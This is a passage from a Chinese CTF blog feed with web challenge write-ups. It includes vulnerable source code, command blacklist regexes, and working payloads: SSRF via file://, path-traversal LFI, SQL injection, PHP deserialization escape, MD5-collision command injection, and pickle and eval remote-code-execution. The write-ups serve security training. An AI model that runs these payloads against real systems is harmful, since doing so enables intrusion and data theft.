class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br><span class="line">   </span><br><span class="line">    &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span><br><span class="line">    &lt;!-- Do you know the nginx? --&gt;</span><br></pre></td></tr></table></figure><p>给了源码，找了资料，发现一张很有用的图片</p><img src="/2020/05/11/buuoj2/16.png" class=""><p>从源码中可以看到，url前面部分是suctf.cc,但是源码中进行了替换，所以c可以用c℆代替</p><p>再是有关nginx的</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Nginx配置文件</span><br><span class="line">配置文件存放目录：/etc/nginx</span><br><span class="line">主配置文件：/etc/nginx/conf/nginx.conf</span><br><span class="line">管理脚本：/usr/lib64/systemd/system/nginx.service</span><br><span class="line">模块：/usr/lisb64/nginx/modules</span><br><span class="line">应用程序：/usr/sbin/nginx</span><br><span class="line">程序默认存放位置：/usr/share/nginx/html</span><br><span class="line">日志默认存放位置：/var/log/nginx</span><br><span class="line">配置文件目录为：/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure><p>payload：file://suctf.c℆sr/local/nginx/conf/nginx.conf，找到flag所在</p><img src="/2020/05/11/buuoj2/17.png" class=""><h4 id="0X08-GWCTF-2019-我有一个数据库"><a href="#0X08-GWCTF-2019-我有一个数据库" class="headerlink" title="0X08:[GWCTF 2019]我有一个数据库"></a>0X08:[GWCTF 2019]我有一个数据库</h4><p>一堆乱码，扫描，发现robots.txt,还找到了phpmyadmin,没有密码直接登录</p><img src="/2020/05/11/buuoj2/18.png" class="" title="examplename"><img src="/2020/05/11/buuoj2/19.png" class="" title="examplename"><p>后续思路附上一篇文章<a href="https://www.jianshu.com/p/fb9c2ae16d09" target="_blank" rel="noopener">https://www.jianshu.com/p/fb9c2ae16d09</a></p><p>payload：?target=db_datadict.php%253f/../../../../../../../../flag</p><img src="/2020/05/11/buuoj2/20.png" class=""><h4 id="0X09-SWPU2019-Web1"><a href="#0X09-SWPU2019-Web1" class="headerlink" title="0X09:[SWPU2019]Web1"></a>0X09:[SWPU2019]Web1</h4><p>虚假登录界面，注册登录有一个发布广告，不是sql就是xss，经过测试应该是sql，测试了挺久没有思路，找了wp，是MariaDB的sql注入</p><img src="/2020/05/11/buuoj2/21.png" class=""><p>过滤了什么自己去测试吧，直接附上payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>, (<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(b)<span class="comment">/**/</span><span class="keyword">from</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>b<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span>*<span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span>)x),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22</span></span><br></pre></td></tr></table></figure><img src="/2020/05/11/buuoj2/22.png" class=""><h4 id="0X10-安洵杯-2019-easy-serialize-php"><a href="#0X10-安洵杯-2019-easy-serialize-php" class="headerlink" title="0X10:[安洵杯 2019]easy_serialize_php"></a>0X10:[安洵杯 2019]easy_serialize_php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>function有三个参数，根据提示在phpinfo()页面可以找到提示，访问一下</p><img src="/2020/05/11/buuoj2/23.png" class=""><p>可以看到自动包含了一个文件，打开不能读取数据，可以看到应该要用序列化的字符逃逸，序列化时会经过一个过滤函数，过滤掉的字符在序列化数据中就可以去掉一些不必要的数据</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>"</span>;s:<span class="number">3</span>:“img”;s:<span class="number">20</span>:“ZDBnM19mMWFnLnBocA==”;s:<span class="number">2</span>:“dd”;s:<span class="number">1</span>:“a”;&#125;</span><br></pre></td></tr></table></figure><p>序列化后：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:“user”;s:<span class="number">24</span>:“flagflagflagflagflagflag”;s:<span class="number">8</span>:“<span class="function"><span class="keyword">function</span>”</span>;s:<span class="number">59</span>:“a”;s:<span class="number">3</span>:“img”;s:<span class="number">20</span>:“ZDBnM19mMWFnLnBocA==”;s:<span class="number">2</span>:“dd”;s:<span class="number">1</span>:“a”;&#125;<span class="string">";s:3:“img”;s:28:“L3VwbG9hZC9ndWVzdF9pbWcuanBn”;&#125;</span></span><br><span class="line"><span class="string">//由于没有传img_path参数，源代码给了默认的参数值guest_img.png</span></span><br></pre></td></tr></table></figure><p>经过过滤之后flag被去掉，空出了24个字符就会往后拿</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:“user”;s:<span class="number">24</span>:<span class="string">""</span>;s:<span class="number">8</span>:“<span class="function"><span class="keyword">function</span>”</span>;s:<span class="number">59</span>:“a”;s:<span class="number">3</span>:“img”;s:<span class="number">20</span>:“ZDBnM19mMWFnLnBocA==”;s:<span class="number">2</span>:“dd”;s:<span class="number">1</span>:“a”;&#125;<span class="string">";s:3:“img”;s:28:“L3VwbG9hZC9ndWVzdF9pbWcuanBn”;&#125;</span></span><br></pre></td></tr></table></figure><p>这样a:3刚好有三个键值对，后面的<code>&quot;;s:3:“img”;s:28:“L3VwbG9hZC9ndWVzdF9pbWcuanBn”;}</code>就被去掉了</p><img src="/2020/05/11/buuoj2/24.png" class=""><p>再改一下要读取的文件base64编码</p><img src="/2020/05/11/buuoj2/25.png" class=""><h4 id="0X11-安洵杯-2019-easy-web"><a href="#0X11-安洵杯-2019-easy-web" class="headerlink" title="0X11:[安洵杯 2019]easy_web"></a>0X11:[安洵杯 2019]easy_web</h4><p>打开题目，没有发现什么有用的信息，只看到了一个MD5 is fun，抓一下包，感觉img参数比较可疑</p><img src="/2020/05/11/buuoj2/26.png" class=""><p>base64解密两次，hex解密一次，发现是555.png，那么index.phphex加密，再base64加密两次可能可以访问</p><p>成功拿到源码，去掉了部分没用的东西</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"xixi～ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>md5碰撞直接可以找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p>可以发现几乎过滤了所有的读取方式，上次的比赛记得cat可以用ca\t绕过，具体的原因也没有去查找资料，有时间再弄，这里直接拿来用了</p><img src="/2020/05/11/buuoj2/27.png" class=""><p>在根目录下发现flag文件，直接读取</p><img src="/2020/05/11/buuoj2/28.png" class=""><h4 id="0X12-CISCN-2019-初赛-Love-Math"><a href="#0X12-CISCN-2019-初赛-Love-Math" class="headerlink" title="0X12:[CISCN 2019 初赛]Love Math"></a>0X12:[CISCN 2019 初赛]Love Math</h4><p>源码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目中有长度限制，中括号被ban掉了，要用进制转换，base_convert ，dechex，第一个可以进行进制之间的转换，比如 base_convert(“1001”2,10)是将二进制的1001转换为10进制，第二个函数是将10进制转成16进制。payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=$_GET[a]($_GET[b])&amp;a=system&amp;b=cat falg</span><br></pre></td></tr></table></figure><p>再用进制转换一下，用上上面的两个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$pi=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));$$pi&#123;pi&#125;($$pi&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag</span><br></pre></td></tr></table></figure><h4 id="0X13-CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#0X13-CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="0X13:[CISCN2019 华北赛区 Day1 Web2]ikun"></a>0X13:[CISCN2019 华北赛区 Day1 Web2]ikun</h4><img src="/2020/05/11/buuoj2/29.png" class=""><p>需要找到lv6，手翻了几页，找不到，写个脚本来找</p><img src="/2020/05/11/buuoj2/30.png" class=""><p>在181页，可以看到价格太高了，猜测可能是js能做修改，发现discount的值能改，改成一个很小的值，提示需要为admin才能访问，在cookie里找到了jwt，放到jwt.io</p><img src="/2020/05/11/buuoj2/31.png" class=""><p>需要让username为admin，这里用到了一个破解工具jwtcrack<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">https://github.com/brendan-rius/c-jwt-cracker</a></p><img src="/2020/05/11/buuoj2/32.png" class=""><p>弄到了密钥，就能够更改得到需要的jwt了，再修改cookie，提示要成为大会员，再源码处发现了<a href="http://www.zip文件，下载过来是一堆python文件，挨个查看，找到了有关序列化的代码" target="_blank" rel="noopener">www.zip文件，下载过来是一堆python文件，挨个查看，找到了有关序列化的代码</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span><span class="params">(BaseHandler)</span>:</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">"admin"</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'no_ass.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">'become'</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>找了python序列化资料，说是python反序列化后产生的对象会在结束时触发<strong>reduce</strong>()函数从而触发恶意代码，重写<em>reduce</em>()魔术方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">"open('/flag.txt','r').read()"</span>,))    <span class="comment">#打开读取flag.txt的内容</span></span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())  <span class="comment">#序列化payload</span></span><br><span class="line">a = urllib.quote(a)  <span class="comment">#进行url编码</span></span><br><span class="line"><span class="keyword">print</span> a</span><br><span class="line">//c__builtin__%<span class="number">0</span>Aeval%<span class="number">0</span>Ap0%<span class="number">0</span>A%<span class="number">28</span>S%<span class="number">22</span>open%<span class="number">28</span>%<span class="number">27</span>/flag.txt%<span class="number">27</span>%<span class="number">2</span>C%<span class="number">27</span>r%<span class="number">27</span>%<span class="number">29.</span>read%<span class="number">28</span>%<span class="number">29</span>%<span class="number">22</span>%<span class="number">0</span>Ap1%<span class="number">0</span>Atp2%<span class="number">0</span>ARp3%<span class="number">0</span>A. 运行结果</span><br></pre></td></tr></table></figure><p>修改become值即可</p><img src="/2020/05/11/buuoj2/33.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow</title>
      <link href="/2020/05/05/ctfshow/"/>
      <url>/2020/05/05/ctfshow/</url>
      
        <content type="html"><![CDATA[<h1 id="36D杯"><a href="#36D杯" class="headerlink" title="36D杯"></a>36D杯</h1><a id="more"></a><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h4 id="0X01-你取吧"><a href="#0X01-你取吧" class="headerlink" title="0X01:你取吧"></a>0X01:你取吧</h4><p>打开题目，给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$hint=file_get_contents(<span class="string">'php://filter/read=convert.base64-encode/resource=hhh.php'</span>);</span><br><span class="line">$code=$_REQUEST[<span class="string">'code'</span>];</span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'l'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'\~'</span>,<span class="string">'\^'</span>);</span><br><span class="line">$blacklist = array_merge($_);</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'nonono'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"echo($code);"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里有两种解法，分别是Ying师傅和HA1C9ON师傅的，下面来尝试一下</p><p>1.之前为了做红包题看过一篇p牛的无数字无字母RCE，只不过当时没想到可以这样做，下面是p牛的写的webshell，直接打就行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 